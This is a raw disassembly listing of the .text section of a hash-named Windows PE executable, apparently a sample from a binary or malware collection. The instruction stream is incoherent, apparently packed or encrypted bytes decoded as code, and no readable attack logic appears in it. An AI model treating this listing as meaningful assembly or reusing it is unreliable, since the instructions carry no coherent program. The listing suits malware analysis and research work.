
bce1f2496f746f52655c19b4b525875da26c349a2557eac40c71caebb736c062.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	aam    0x52
  411002:	inc    esp
  411003:	mov    bh,0x38
  411005:	cmp    dh,BYTE PTR [ebx]
  411007:	addr16 mov ebx,0x118a7cbd
  41100d:	push   esp
  41100e:	sub    bl,BYTE PTR [edx]
  411010:	mov    BYTE PTR [ebp-0x76c26583],al
  411016:	out    dx,eax
  411017:	sub    eax,0x6a232233
  41101c:	push   esp
  41101d:	inc    ecx
  41101e:	push   eax
  41101f:	iret   
  411020:	jl     0x411093
  411022:	pop    eax
  411023:	inc    ebx
  411024:	lahf   
  411025:	add    ebp,DWORD PTR [ecx-0x33fb5796]
  41102b:	loope  0x410fd6
  41102d:	sbb    eax,DWORD PTR [eax-0x61]
  411030:	sbb    dl,BYTE PTR [edx+0x53d9e574]
  411036:	ins    BYTE PTR es:[edi],dx
  411037:	adc    cl,BYTE PTR [eax]
  411039:	fld    TBYTE PTR [edx+0x3debc2cc]
  41103f:	pop    ecx
  411040:	fsub   st(2),st
  411042:	aas    
  411043:	jo     0x41101a
  411045:	stc    
  411046:	inc    edi
  411047:	sbb    BYTE PTR [esi-0x52189c86],0x84
  41104e:	or     eax,0xf01b99a3
  411053:	mov    ds:0xa9ef85e1,al
  411058:	mov    dh,0xb6
  41105a:	jmp    0x411083
  41105c:	push   eax
  41105d:	xchg   ebx,eax
  41105e:	add    eax,0x8dec8890
  411064:	lea    edi,[eax]
  411066:	aaa    
  411067:	push   es
  411068:	scas   al,BYTE PTR es:[edi]
  411069:	pop    ecx
  41106a:	push   ds
  41106b:	mov    BYTE PTR [esi+0x1a5577cd],dl
  411071:	das    
  411072:	fnsave [ecx+eiz*8]
  411075:	aaa    
  411076:	or     al,0xcd
  411078:	int3   
  411079:	dec    ebx
  41107a:	loop   0x411063
  41107c:	cs push edx
  41107e:	arpl   di,sp
  411080:	xchg   esi,eax
  411081:	adc    eax,0xa2a1fdf8
  411086:	clc    
  411087:	in     al,0xc0
  411089:	xor    esi,edx
  41108b:	ret    
  41108c:	out    dx,eax
  41108d:	jns    0x4110cf
  41108f:	loope  0x4110b5
  411091:	pusha  
  411092:	rcl    DWORD PTR [edi+0x7a2d23bd],cl
  411098:	aas    
  411099:	mov    ds:0xd882bf79,eax
  41109e:	int    0x10
  4110a0:	pop    ebx
  4110a1:	cmp    ch,BYTE PTR [edi]
  4110a3:	cld    
  4110a4:	ins    BYTE PTR es:[edi],dx
  4110a5:	and    edx,esi
  4110a7:	push   0x7a95a872
  4110ac:	xchg   ecx,eax
  4110ad:	loope  0x411128
  4110af:	inc    ebx
  4110b0:	mov    eax,ds:0x235a7917
  4110b5:	and    cl,BYTE PTR [eax]
  4110b7:	jb     0x411099
  4110b9:	int3   
  4110ba:	loop   0x4110b1
  4110bc:	dec    edx
  4110bd:	leave  
  4110be:	or     ebx,edi
  4110c0:	iret   
  4110c1:	(bad)  
  4110c3:	inc    esi
  4110c4:	fwait
  4110c5:	stos   BYTE PTR es:[edi],al
  4110c6:	outs   dx,DWORD PTR ds:[esi]
  4110c7:	mov    esp,0x4f922050
  4110cc:	sbb    DWORD PTR [ecx+0x7e],eax
  4110cf:	mov    ah,0xed
  4110d1:	push   0x8a7fb568
  4110d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110d7:	es sub edx,eax
  4110da:	jno    0x411066
  4110dc:	cmp    DWORD PTR [ebx-0x40442b18],0x46b00ac3
  4110e6:	xor    ebp,edx
  4110e8:	add    al,0xe6
  4110ea:	add    al,0xc9
  4110ec:	push   edx
  4110ed:	fistp  DWORD PTR ds:0xb76e4f2b
  4110f3:	push   es
  4110f4:	ror    BYTE PTR [esi-0x19],0x24
  4110f8:	test   ebx,ebp
  4110fa:	lods   eax,DWORD PTR ds:[esi]
  4110fb:	dec    ebx
  4110fc:	xchg   ecx,eax
  4110fd:	push   esp
  4110fe:	adc    BYTE PTR [edx-0x7c],dh
  411101:	es jmp 0x515c:0xf227eaff
  411109:	jl     0x411142
  41110b:	test   eax,0x8fae2967
  411110:	dec    eax
  411111:	ror    dl,1
  411113:	and    bh,bh
  411115:	mov    dl,0x5c
  411117:	mov    esp,0xdb462272
  41111c:	lock xchg DWORD PTR [ebp+0x5009d255],eax
  411123:	fbstp  TBYTE PTR [esi+0x5dfde7b0]
  411129:	jp     0x4110c4
  41112b:	in     al,0x21
  41112d:	iret   
  41112e:	add    al,bl
  411130:	lahf   
  411131:	ror    DWORD PTR [eax+0x509c9a78],cl
  411137:	das    
  411138:	push   ebp
  411139:	shl    DWORD PTR [eax+0x1506e9d9],cl
  41113f:	mov    cl,0x62
  411141:	sub    al,0xbf
  411143:	loop   0x411181
  411145:	out    dx,eax
  411146:	dec    esi
  411147:	jl     0x4110ca
  411149:	stc    
  41114a:	cmp    BYTE PTR [edx+0x13],bh
  41114d:	push   esi
  41114e:	inc    ebp
  41114f:	or     ah,cl
  411151:	jecxz  0x41115d
  411153:	call   0x1ee23443
  411158:	scas   eax,DWORD PTR es:[edi]
  411159:	dec    DWORD PTR [esi-0x22834a45]
  41115f:	mov    cl,0x25
  411161:	pushf  
  411162:	outs   dx,DWORD PTR ds:[esi]
  411163:	or     bh,BYTE PTR gs:[eax-0x5]
  411167:	dec    esp
  411168:	cmp    al,0x8c
  41116a:	and    DWORD PTR [esi],esp
  41116c:	and    DWORD PTR [ecx+edx*8],ebp
  41116f:	sub    DWORD PTR [esi-0x27bbc223],esp
  411175:	mov    dl,0x2
  411177:	sbb    BYTE PTR [ebx],0x88
  41117a:	test   DWORD PTR [edx-0x62],eax
  41117d:	das    
  41117e:	pop    ss
  41117f:	mov    dl,0xf5
  411181:	dec    edi
  411182:	sti    
  411183:	ss inc eax
  411185:	xchg   esp,eax
  411186:	(bad)  
  411187:	and    DWORD PTR [eax],esi
  411189:	xchg   ecx,eax
  41118a:	jmp    0x9153:0x4d035dc
  411191:	int3   
  411192:	nop
  411193:	div    BYTE PTR ds:0x5af02898
  411199:	cmp    al,0x8
  41119b:	cli    
  41119c:	rsqrtps xmm7,XMMWORD PTR [esi]
  41119f:	loopne 0x41115b
  4111a1:	xchg   edx,eax
  4111a2:	jno    0x411188
  4111a4:	jo     0x41119d
  4111a6:	add    BYTE PTR ds:[edi*2-0xc387a50],0xc2
  4111af:	outs   dx,BYTE PTR ds:[esi]
  4111b0:	and    al,0x41
  4111b2:	push   cs
  4111b3:	pop    ecx
  4111b4:	retf   0xd4a5
  4111b7:	enter  0x7669,0x36
  4111bb:	mov    esi,0xe4005b46
  4111c0:	cmp    eax,0x2b4198ad
  4111c5:	sub    edx,DWORD PTR [edx-0x78]
  4111c8:	stos   BYTE PTR es:[edi],al
  4111c9:	or     DWORD PTR [edi*2-0x73c24527],edi
  4111d0:	sar    DWORD PTR [edx+edi*4+0x476ed31d],0x1f
  4111d8:	and    al,dl
  4111da:	ficomp WORD PTR [edx-0x6c7fd0c9]
  4111e0:	(bad)  
  4111e1:	and    al,0x64
  4111e3:	int3   
  4111e4:	push   ebx
  4111e5:	int3   
  4111e6:	xchg   esi,eax
  4111e7:	xchg   edi,eax
  4111e8:	rcl    BYTE PTR [ebx],cl
  4111ea:	into   
  4111eb:	dec    esi
  4111ec:	icebp  
  4111ed:	neg    BYTE PTR [eax+edi*4]
  4111f0:	mov    esi,DWORD PTR [eax-0x5412a105]
  4111f6:	dec    eax
  4111f7:	xchg   DWORD PTR ds:0x636f,ebx
  4111fc:	pop    esi
  4111fd:	fwait
  4111fe:	stos   BYTE PTR es:[edi],al
  4111ff:	lock mov edx,0x869ca056
  411205:	xor    BYTE PTR [ebx+0x4e3d0cd7],dh
  41120b:	out    dx,eax
  41120c:	sbb    BYTE PTR [edi+ecx*1],ch
  41120f:	cmp    dl,BYTE PTR [edi]
  411211:	pop    esp
  411212:	pop    ebx
  411213:	frstor [edx]
  411215:	rol    BYTE PTR [ecx+0x3db54ee9],0x1f
  41121c:	int    0x7f
  41121e:	adc    al,0x92
  411221:	add    edi,eax
  411223:	std    
  411224:	mov    cl,0xb7
  411226:	push   0x38c1af7b
  41122b:	and    esi,eax
  41122d:	push   ecx
  41122e:	or     bh,BYTE PTR [esp+edi*4+0x2d]
  411232:	shl    DWORD PTR [ebx],1
  411234:	outs   dx,BYTE PTR ds:[esi]
  411235:	mov    bh,0x86
  411237:	push   es
  411238:	xchg   ebp,eax
  411239:	mov    esp,0xe7bf91e6
  41123e:	sub    ebx,ecx
  411240:	push   ecx
  411241:	push   ebp
  411242:	cmc    
  411243:	pop    edi
  411244:	jg     0x411236
  411246:	leave  
  411247:	test   ch,cl
  411249:	or     edi,edx
  41124b:	mov    bh,BYTE PTR [esi+0x2b]
  41124e:	repnz (bad) 
  411250:	int3   
  411251:	hlt    
  411252:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411253:	js     0x4112bb
  411255:	sub    DWORD PTR [ebx],eax
  411257:	retf   0xdf60
  41125a:	dec    ecx
  41125b:	inc    ebp
  41125c:	push   eax
  41125d:	inc    BYTE PTR gs:[ebx]
  411260:	retf   0xb314
  411263:	fwait
  411264:	jne    0x4112b4
  411266:	dec    esi
  411267:	pusha  
  411268:	scas   eax,DWORD PTR es:[edi]
  411269:	fst    DWORD PTR [ebx+0x1f07c2bb]
  41126f:	push   ecx
  411270:	test   eax,0x65e282f8
  411275:	pop    ebx
  411276:	cwde   
  411277:	std    
  411278:	ffreep st(2)
  41127a:	hlt    
  41127b:	mov    ah,0xb0
  41127d:	outs   dx,DWORD PTR ds:[esi]
  41127e:	pop    edi
  41127f:	jg     0x4112e9
  411281:	sbb    eax,0x14723916
  411286:	jmp    0x8772:0xbf1a298f
  41128d:	repz and DWORD PTR [ebp+0x3e67c79b],esi
  411294:	ror    DWORD PTR [ebx+0x12e8ee8d],cl
  41129a:	mov    edx,0x392eb34e
  41129f:	ror    BYTE PTR [ebp-0x50],0x5b
  4112a3:	adc    BYTE PTR [esi],dl
  4112a5:	add    al,0xfa
  4112a7:	xchg   ecx,eax
  4112a8:	(bad)  
  4112aa:	call   0x50c4:0xc4756526
  4112b1:	idiv   BYTE PTR [eax]
  4112b3:	and    DWORD PTR [ecx-0x68],ebp
  4112b6:	adc    eax,0x9d6a5067
  4112bb:	dec    ebx
  4112bc:	jge    0x411279
  4112be:	aad    0xff
  4112c0:	outs   dx,BYTE PTR ds:[esi]
  4112c1:	hlt    
  4112c2:	mov    ecx,0xa656e5c9
  4112c7:	aad    0xed
  4112c9:	jecxz  0x4112c3
  4112cb:	loop   0x4112ed
  4112cd:	fnstsw WORD PTR [eax]
  4112cf:	dec    edx
  4112d0:	inc    ecx
  4112d1:	sbb    BYTE PTR [ebp+0x1fbfe847],dl
  4112d7:	call   0x649122e3
  4112dc:	jno    0x411323
  4112de:	adc    al,0xd1
  4112e0:	(bad)  
  4112e1:	sbb    ch,BYTE PTR [edx*2+0x4540d07e]
  4112e8:	pop    edx
  4112e9:	or     bl,al
  4112eb:	out    dx,al
  4112ec:	xor    eax,0xbccd10cd
  4112f1:	add    dl,0xfb
  4112f4:	add    DWORD PTR [edi],esp
  4112f6:	push   esi
  4112f7:	aad    0x42
  4112f9:	push   ss
  4112fa:	jo     0x41130c
  4112fc:	jbe    0x4112fc
  4112fe:	mov    BYTE PTR [edx+0x4a9e99],bh
  411304:	jo     0x41133d
  411306:	mov    dl,0xfe
  411308:	mov    WORD PTR [edx+0x4bcf1154],?
  41130e:	dec    edx
  41130f:	lds    edx,FWORD PTR [eax+edx*4-0xd]
  411313:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411314:	icebp  
  411315:	sti    
  411316:	in     eax,dx
  411317:	push   ds
  411318:	sub    eax,0xf1e7219b
  41131d:	sub    eax,0x64065a12
  411322:	xchg   ecx,eax
  411323:	push   eax
  411324:	xchg   edx,eax
  411325:	and    dl,dh
  411327:	loop   0x411351
  411329:	bound  esp,QWORD PTR [eax]
  41132b:	test   eax,0xa593fd2d
  411330:	sub    BYTE PTR [esi-0x702a8824],dh
  411336:	or     eax,0x891295db
  41133b:	stos   DWORD PTR es:[edi],eax
  41133c:	jnp    0x4112d0
  41133e:	pop    esi
  41133f:	cli    
  411340:	dec    esp
  411341:	dec    ecx
  411342:	add    cl,0xb0
  411345:	add    BYTE PTR [edi+0x4a8625f0],dl
  41134b:	pusha  
  41134c:	adc    DWORD PTR [edx],edi
  41134e:	mov    bl,bl
  411350:	pop    ss
  411351:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411352:	mov    al,0xf3
  411354:	repnz ror DWORD PTR [esi],1
  411357:	xor    al,0x52
  411359:	add    eax,DWORD PTR [edx]
  41135b:	adc    cl,al
  41135d:	jbe    0x4113b0
  41135f:	fadd   QWORD PTR [edi+0x67]
  411362:	je     0x41138f
  411364:	cwde   
  411365:	lods   eax,DWORD PTR ds:[esi]
  411366:	inc    esi
  411367:	aas    
  411368:	sbb    BYTE PTR [edx-0x6f03274],cl
  41136e:	or     bh,BYTE PTR [eax]
  411370:	adc    BYTE PTR [ebp+edx*1+0x4054e763],ah
  411377:	shl    DWORD PTR [edi],cl
  411379:	cld    
  41137a:	jae    0x4113a6
  41137c:	shr    bl,cl
  41137e:	mov    dl,BYTE PTR [ebx-0x256a1845]
  411384:	sub    edx,DWORD PTR ds:[ecx]
  411387:	fs call 0x5e84:0x27b35c7a
  41138f:	add    BYTE PTR [ebp+ebp*8-0x27],ch
  411393:	pop    ds
  411394:	jecxz  0x411348
  411396:	sbb    BYTE PTR [edx-0x7e40c488],0x87
  41139d:	pusha  
  41139e:	mov    bh,0x6
  4113a0:	hlt    
  4113a1:	pop    eax
  4113a2:	lods   eax,DWORD PTR ds:[esi]
  4113a3:	and    BYTE PTR [esp+ecx*8+0x27],dl
  4113a7:	dec    ecx
  4113a8:	xchg   edx,eax
  4113a9:	lea    ebx,[ebx-0x4535e1cc]
  4113af:	jmp    DWORD PTR gs:[edx+0x5e9913a7]
  4113b6:	cwde   
  4113b7:	rcl    DWORD PTR [ebp+0x3ec2a18e],cl
  4113bd:	push   esi
  4113be:	inc    edx
  4113bf:	mov    al,ds:0x6c5f07aa
  4113c4:	jno    0x4113f9
  4113c6:	test   eax,0x8bb774a0
  4113cb:	cld    
  4113cc:	mov    ds:0x7c70e7e0,eax
  4113d1:	dec    edi
  4113d2:	mov    cl,0x3c
  4113d4:	les    esi,FWORD PTR [ebx-0x5c]
  4113d7:	and    DWORD PTR [esi],ebp
  4113d9:	inc    ebx
  4113da:	ins    DWORD PTR es:[edi],dx
  4113db:	sbb    BYTE PTR [esp+edx*1+0x1a3de776],dh
  4113e2:	mov    ch,0x16
  4113e4:	lea    ecx,[eax-0x6307a148]
  4113ea:	js     0x411371
  4113ec:	stc    
  4113ed:	call   0x66ae:0x970de223
  4113f4:	jae    0x41141b
  4113f6:	dec    ebp
  4113f7:	mov    ebp,0x399872f7
  4113fc:	or     al,0x6a
  4113fe:	lods   eax,DWORD PTR ds:[esi]
  4113ff:	xchg   edx,edi
  411401:	xor    eax,0xe8a244e7
  411406:	mov    dl,0x9a
  411408:	jno    0x41139b
  41140a:	lea    edx,[ebx+edx*2-0x5a]
  41140e:	int3   
  41140f:	push   0xfffffff9
  411411:	push   edi
  411412:	test   eax,0x5ff10776
  411417:	icebp  
  411418:	mov    BYTE PTR [edx-0x69],dl
  41141b:	std    
  41141c:	push   eax
  41141d:	mov    esp,0x4dddd37a
  411422:	push   ecx
  411423:	shl    DWORD PTR [esi+eiz*4],cl
  411426:	ins    BYTE PTR es:[edi],dx
  411427:	mul    al
  411429:	mov    esi,0x42fbb2c4
  41142e:	mov    WORD PTR ds:0xfeb892c9,ds
  411434:	mov    dh,BYTE PTR [ebx+ebp*8]
  411437:	std    
  411438:	xor    eax,0xffffffb7
  41143b:	aam    0x5c
  41143d:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41143f:	pop    ebp
  411440:	retf   0xf532
  411443:	stos   DWORD PTR es:[edi],eax
  411444:	sahf   
  411445:	js     0x4113f5
  411447:	jnp    0x41140d
  411449:	inc    esp
  41144a:	stos   DWORD PTR es:[edi],eax
  41144b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41144c:	push   esp
  41144d:	mov    ebp,0x59a7f005
  411452:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411453:	sub    BYTE PTR [esi+0x5973e536],0x41
  41145a:	mov    edi,0x7569145d
  41145f:	jp     0x4114c5
  411461:	add    ecx,DWORD PTR [ecx-0x63be32ab]
  411467:	push   edi
  411468:	adc    eax,0xd45e82b4
  41146d:	cmc    
  41146e:	imul   edi,DWORD PTR ds:0xde050cde,0xd5929305
  411478:	adc    DWORD PTR [edx],ebp
  41147a:	fsubr  DWORD PTR [edx]
  41147c:	ins    DWORD PTR es:[edi],dx
  41147d:	jl     0x41146d
  41147f:	lea    ebx,[ebp+0x4f]
  411482:	rcr    DWORD PTR [edx-0x3077a9eb],0x73
  411489:	(bad)  
  41148a:	cmp    DWORD PTR [ecx],edx
  41148c:	mov    ebp,0xfc238675
  411491:	fild   WORD PTR [ecx+eiz*8+0x2992d5f]
  411498:	push   edi
  411499:	scas   eax,DWORD PTR es:[edi]
  41149a:	test   DWORD PTR [edx-0x51a164fe],edx
  4114a0:	mov    dh,0x8f
  4114a2:	push   cs
  4114a3:	aam    0x98
  4114a5:	mov    ds:0x2326425d,eax
  4114aa:	jp     0x4114f3
  4114ac:	push   es
  4114ad:	mov    ebx,0x76beab60
  4114b2:	sub    esp,DWORD PTR [esi+0x5f]
  4114b5:	mov    edi,0x5f297e61
  4114ba:	stos   BYTE PTR es:[edi],al
  4114bb:	dec    esi
  4114bc:	ficom  WORD PTR [edi+ecx*1-0x3756c17f]
  4114c3:	in     eax,dx
  4114c4:	mov    BYTE PTR [ebp-0x27],ch
  4114c7:	scas   eax,DWORD PTR es:[edi]
  4114c8:	ins    DWORD PTR es:[edi],dx
  4114c9:	sub    edx,DWORD PTR [esi+0x3aad5fdc]
  4114cf:	sub    dl,BYTE PTR [edx-0x507f2c61]
  4114d5:	inc    ecx
  4114d6:	nop
  4114d7:	scas   eax,DWORD PTR es:[edi]
  4114d8:	(bad)  
  4114d9:	sbb    al,0x24
  4114db:	lock addr16 mov cl,0xe4
  4114df:	(bad)  
  4114e0:	(bad)  [edx-0x60]
  4114e3:	mov    ah,0x83
  4114e5:	adc    eax,DWORD PTR [ebx]
  4114e7:	ret    0xe6e5
  4114ea:	push   edi
  4114eb:	pop    esp
  4114ec:	or     BYTE PTR [edx+eiz*1],ah
  4114ef:	mov    cs,WORD PTR [edx]
  4114f1:	inc    ebx
  4114f2:	adc    al,0xc3
  4114f4:	pusha  
  4114f5:	cmp    DWORD PTR [esi-0x4d6220f7],esp
  4114fb:	mov    ebx,0x20ac73ff
  411500:	add    cl,BYTE PTR [edi+0x59]
  411503:	popa   
  411504:	push   0x80df2f27
  411509:	jo     0x41150a
  41150b:	hlt    
  41150c:	inc    esp
  41150d:	push   ss
  41150e:	call   DWORD PTR [ebp+0x5bff4e05]
  411514:	cmc    
  411515:	inc    edi
  411516:	jecxz  0x41151e
  411518:	adc    DWORD PTR [ebp-0x5b],ecx
  41151b:	jne    0x41154c
  41151d:	lods   al,BYTE PTR ds:[esi]
  41151e:	aas    
  41151f:	addr16 jg 0x411592
  411522:	xor    BYTE PTR ds:0x83436982,0xc2
  411529:	in     al,dx
  41152a:	fs rol dl,0xd2
  41152e:	outs   dx,BYTE PTR ds:[esi]
  41152f:	xchg   ebp,eax
  411530:	lahf   
  411531:	dec    ebx
  411532:	pop    edi
  411533:	out    dx,eax
  411534:	stos   BYTE PTR es:[edi],al
  411535:	dec    edx
  411536:	mov    cl,0xf
  411538:	pop    edi
  411539:	ror    DWORD PTR [edi-0x39ae639e],1
  41153f:	dec    edi
  411540:	mov    ah,0x25
  411542:	xchg   ecx,eax
  411543:	rol    ecx,0xc6
  411546:	std    
  411547:	mov    ecx,0x7893f894
  41154c:	sbb    ah,BYTE PTR [eax]
  41154e:	cmp    ch,bh
  411550:	scas   al,BYTE PTR es:[edi]
  411551:	aas    
  411552:	stc    
  411553:	sbb    cl,al
  411555:	mov    cl,0xbe
  411557:	test   dl,al
  411559:	pusha  
  41155a:	mov    esi,0x603a9d4a
  41155f:	adc    dl,dh
  411561:	jno    0x4115e1
  411563:	or     eax,0x6dc8f6ff
  411568:	add    cl,BYTE PTR [edx]
  41156a:	retf   
  41156b:	pop    ebp
  41156c:	lahf   
  41156d:	mov    dh,BYTE PTR [edi+0x66]
  411570:	scas   al,BYTE PTR es:[edi]
  411571:	push   edx
  411572:	out    dx,al
  411573:	arpl   WORD PTR [ecx+0x611a17ca],bp
  411579:	outs   dx,DWORD PTR ds:[esi]
  41157a:	pushf  
  41157b:	mul    DWORD PTR ds:0x1768c30d
  411581:	fpatan 
  411583:	xchg   ebp,eax
  411584:	enter  0x7f26,0xc0
  411588:	aam    0x57
  41158a:	icebp  
  41158b:	adc    edi,esi
  41158d:	jle    0x411603
  41158f:	or     al,0x1d
  411591:	in     al,0xa4
  411593:	test   al,0x59
  411595:	call   0x43802d61
  41159a:	jg     0x411580
  41159c:	cdq    
  41159d:	xlat   BYTE PTR ds:[ebx]
  41159e:	retf   0x4b8
  4115a1:	stos   DWORD PTR es:[edi],eax
  4115a2:	test   eax,0x1085adae
  4115a7:	popa   
  4115a8:	daa    
  4115a9:	mov    edx,0xabd1bc36
  4115ae:	mov    BYTE PTR [ecx-0x6ca44287],bl
  4115b4:	or     eax,0xf14758a8
  4115b9:	out    0xf1,al
  4115bb:	adc    al,0x8d
  4115bd:	xor    eax,0x4f357f10
  4115c2:	pop    es
  4115c3:	mov    ?,WORD PTR [eax]
  4115c5:	hlt    
  4115c6:	ror    DWORD PTR [edx-0x5c],1
  4115c9:	test   cl,al
  4115cb:	mov    cl,0x53
  4115cd:	fstp   QWORD PTR [ebp+0xc48758c]
  4115d3:	fidiv  WORD PTR [ebp+0x62]
  4115d6:	imul   ecx,DWORD PTR [esp+ecx*4-0x3f],0xf29322b7
  4115de:	dec    ebp
  4115df:	jp     0x4115b7
  4115e1:	test   BYTE PTR [esi+0x41a754a0],ch
  4115e7:	push   ebx
  4115e8:	in     al,dx
  4115e9:	adc    ebp,0x70d78086
  4115ef:	sar    BYTE PTR [edx-0x15],1
  4115f2:	mov    ch,0xba
  4115f4:	fsubr  QWORD PTR [ebx-0x23]
  4115f7:	xor    BYTE PTR [esi+eiz*8],ch
  4115fa:	adc    dl,dl
  4115fc:	pop    ebp
  4115fd:	xchg   esp,eax
  4115fe:	xchg   eax,esi
  411600:	push   esi
  411601:	nop
  411602:	jge    0x411600
  411604:	push   ecx
  411605:	mov    esp,DWORD PTR [ebx+0x5bd4d438]
  41160b:	leave  
  41160c:	mov    BYTE PTR [ebp+esi*2-0x2a],dl
  411610:	cmp    DWORD PTR [edx+0x278769cd],edx
  411616:	mov    esp,0x982adb3b
  41161b:	jo     0x411607
  41161d:	sub    BYTE PTR [ebx+0x21c181b6],0xd0
  411624:	shr    DWORD PTR [eax-0x7e9bf107],0x88
  41162b:	push   esi
  41162c:	sbb    ebp,ecx
  41162e:	adc    ecx,DWORD PTR [ebp-0x411f5592]
  411634:	repz pop ss
  411636:	imul   ecx,DWORD PTR [ebp+0x4b],0x8380483d
  41163d:	and    ebx,ecx
  41163f:	xchg   ecx,eax
  411640:	call   0x4edf:0xd69d845
  411647:	dec    eax
  411648:	and    DWORD PTR ds:0x84dd37e6,ebx
  41164e:	cmp    dh,BYTE PTR [eax+0x3]
  411651:	or     eax,0xc25b6343
  411656:	jge    0x41168b
  411658:	(bad)
  41165b:	xchg   edx,eax
  41165c:	test   ch,0x5d
  41165f:	std    
  411660:	mov    cl,0xc9
  411662:	jp     0x41165c
  411664:	ds jo  0x41162f
  411667:	push   esi
  411668:	mov    al,0x5e
  41166a:	adc    DWORD PTR [eax+0x78],ebx
  41166d:	or     cl,0xb9
  411670:	or     ecx,edi
  411672:	fild   WORD PTR [edx]
  411674:	lea    edx,ds:0x2f43612b
  41167a:	sbb    BYTE PTR [edx-0x6e],ch
  41167d:	cmp    BYTE PTR [esi+eax*1+0x73],dl
  411681:	iret   
  411682:	pop    ebp
  411683:	out    dx,al
  411684:	retf   0x793a
  411687:	arpl   sp,cx
  411689:	jb     0x411667
  41168b:	push   cs
  41168c:	iret   
  41168d:	sub    eax,0x7eb8cf56
  411692:	in     eax,dx
  411693:	int    0x8
  411695:	js     0x4116a3
  411697:	push   DWORD PTR [esp+eiz*4]
  41169a:	imul   ebp,DWORD PTR [eax-0x43d7f78c],0x1d
  4116a1:	sbb    DWORD PTR [edi-0x2a],ebp
  4116a4:	push   ds
  4116a5:	aaa    
  4116a6:	add    dh,BYTE PTR [eax-0x2e]
  4116a9:	fstp   TBYTE PTR [edi+0x7c]
  4116ac:	push   ecx
  4116ad:	clc    
  4116ae:	fsub   st(5),st
  4116b0:	in     al,dx
  4116b1:	push   es
  4116b2:	inc    ebp
  4116b3:	sub    ebp,ebp
  4116b5:	out    0x1d,eax
  4116b7:	push   cs
  4116b8:	push   edx
  4116b9:	jge    0x41163b
  4116bb:	das    
  4116bc:	cmp    edx,0x39ab4592
  4116c2:	mov    esp,0x8d934bff
  4116c7:	dec    esp
  4116c8:	retf   0xf43c
  4116cb:	pop    esi
  4116cc:	push   cs
  4116cd:	mov    ecx,0x8a64cf8f
  4116d2:	pop    esp
  4116d3:	ret    0x7d6f
  4116d6:	aad    0xd5
  4116d8:	dec    ebp
  4116d9:	jnp    0x4116f3
  4116db:	std    
  4116dc:	inc    BYTE PTR [ecx]
  4116de:	fcmovnb st,st(0)
  4116e0:	mov    ebx,0x34144b9f
  4116e5:	stc    
  4116e6:	or     BYTE PTR fs:0x233e11b8,ch
  4116ed:	jecxz  0x41174d
  4116ef:	cdq    
  4116f0:	shl    BYTE PTR ds:0x617a12d9,1
  4116f6:	call   0xc39a:0xaebe4f19
  4116fd:	inc    ebx
  4116fe:	cmp    bh,BYTE PTR [ebx+0x7]
  411701:	or     al,0xe5
  411703:	push   cs
  411704:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411705:	into   
  411706:	pop    ecx
  411707:	cld    
  411708:	lods   eax,DWORD PTR ds:[esi]
  411709:	dec    esi
  41170a:	in     eax,0x5d
  41170c:	xlat   BYTE PTR ds:[ebx]
  41170d:	jns    0x41177c
  41170f:	pop    esi
  411710:	xor    eax,0x654f4bd1
  411715:	xchg   DWORD PTR cs:[esi],edi
  411718:	and    esp,edx
  41171a:	mov    bl,0xf8
  41171c:	lods   al,BYTE PTR ds:[esi]
  41171d:	(bad)  
  41171f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411720:	imul   ebx,DWORD PTR [esi],0xfffffff6
  411723:	mov    ebx,0xc8ab8a4f
  411728:	xchg   ebp,eax
  411729:	xchg   ecx,eax
  41172a:	pushf  
  41172b:	pop    esi
  41172c:	push   edx
  41172d:	push   es
  41172e:	sti    
  41172f:	loopne 0x4116c7
  411731:	xchg   ecx,edx
  411733:	and    eax,0x8ba6ac5f
  411738:	or     al,BYTE PTR [eax]
  41173a:	mov    eax,ds:0x1a0e1493
  41173f:	sahf   
  411740:	out    dx,al
  411741:	inc    edx
  411742:	mov    al,0xf5
  411744:	cmp    ebx,ecx
  411746:	js     0x41173f
  411748:	jns    0x41173f
  41174a:	push   edi
  41174b:	jbe    0x4117ca
  41174d:	dec    esp
  41174e:	jmp    0x411790
  411750:	and    al,BYTE PTR [esi-0x3a61a589]
  411756:	sub    dl,ah
  411758:	push   ebx
  411759:	repz or al,0x97
  41175c:	pop    es
  41175d:	int3   
  41175e:	rol    BYTE PTR [ebx+0x61],0x91
  411762:	sti    
  411763:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411764:	xor    DWORD PTR [esi-0x6d9924dd],esp
  41176a:	dec    esi
  41176b:	push   esp
  41176c:	push   0xffffffe5
  41176e:	sub    BYTE PTR [eax+edi*8-0xaeeffef],ch
  411775:	adc    al,0xf6
  411777:	xor    al,0xf6
  411779:	xor    DWORD PTR [ecx],0xea6b14ab
  41177f:	dec    esi
  411780:	loop   0x411801
  411782:	shl    DWORD PTR [esi-0x63],0xd0
  411786:	std    
  411787:	push   edx
  411788:	int    0xe7
  41178a:	mov    BYTE PTR [ebx-0xa],0x5c
  41178e:	sbb    al,0xd3
  411790:	popa   
  411791:	cmc    
  411792:	std    
  411793:	pop    edi
  411794:	(bad)  
  411797:	or     BYTE PTR [ecx],dh
  411799:	iret   
  41179a:	out    0x49,al
  41179c:	jp     0x41174b
  41179e:	sbb    DWORD PTR [edi],ecx
  4117a0:	add    ebx,DWORD PTR [ecx+eiz*8]
  4117a3:	cmc    
  4117a4:	aad    0x16
  4117a6:	(bad)  
  4117a7:	mov    edi,0xa8c1669
  4117ac:	mov    fs,WORD PTR [esi-0x10]
  4117af:	sbb    dh,ah
  4117b1:	adc    BYTE PTR [ebx],ch
  4117b3:	and    dh,BYTE PTR [edx+0x6d084836]
  4117b9:	in     al,0x4
  4117bb:	dec    esi
  4117bc:	xlat   BYTE PTR ss:[ebx]
  4117be:	fild   QWORD PTR [edi-0x2b514cea]
  4117c4:	pusha  
  4117c5:	pop    ecx
  4117c6:	adc    ebx,DWORD PTR [eax+0x74]
  4117c9:	les    edx,FWORD PTR [edi+0x36]
  4117cc:	jmp    0x411787
  4117ce:	mov    esp,0x6b6542f9
  4117d3:	inc    ebp
  4117d4:	arpl   WORD PTR [ebx-0x64c7a864],cx
  4117da:	sbb    edi,DWORD PTR [esi]
